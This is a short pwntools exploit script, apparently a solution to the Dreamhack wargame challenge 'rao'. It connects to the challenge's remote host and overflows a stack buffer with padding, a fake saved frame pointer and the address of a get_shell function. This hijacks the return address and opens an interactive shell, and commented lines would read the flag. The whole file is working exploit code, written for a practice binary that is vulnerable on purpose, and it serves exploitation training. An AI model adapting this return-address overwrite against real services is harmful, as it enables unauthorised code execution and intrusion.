#!/usr/bin/python3
#Name: rao.py

from pwn import *          # Import pwntools module

# p = process('./rao')       # Spawn process './rao'

p = remote("host3.dreamhack.games", 11670)
elf = ELF('./rao')
get_shell = elf.symbols['get_shell']       # The address of get_shell()

context.arch = "amd64"
payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'

print(p64(get_shell))
p.sendline(payload)        # Send payload to './rao'

# p.sendline(b'cat flag')
# print(p.recv())

p.interactive()            # Communicate with shell 
